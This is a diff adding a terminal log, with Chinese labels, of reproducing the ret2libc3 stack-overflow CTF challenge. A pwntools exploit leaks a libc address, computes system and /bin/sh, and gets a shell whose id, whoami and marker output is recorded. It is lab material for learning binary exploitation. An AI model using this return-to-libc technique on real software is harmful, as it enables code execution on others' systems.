@@ -1,0 +1,19 @@
+复现实验终端记录 | ret2libc3
+命令：python3 ret2libc3_repro/exploit.py（交互阶段发送 id; whoami; echo RET2LIBC3_EVIDENCE_OK）
+结果：通过（exit=0）
+
+[x] Starting local process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc3/ret2libc3'
+[+] Starting local process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc3/ret2libc3': pid 26417
+[*] leaked __libc_start_main = 0xf7d1fde0
+[*] libc base = 0xf7d05000
+[*] system = 0xf7d46360, /bin/sh = 0xf7e91363
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 133B
+[x] Receiving all data: 137B
+[x] Receiving all data: 159B
+[+] Receiving all data: Done (159B)
+[*] Process '/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc3/ret2libc3' stopped with exit code -11 (SIGSEGV) (pid 26417)
+用户id=1000(xyx) 组id=1000(xyx) 组=1000(xyx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
+xyx
+RET2LIBC3_EVIDENCE_OK
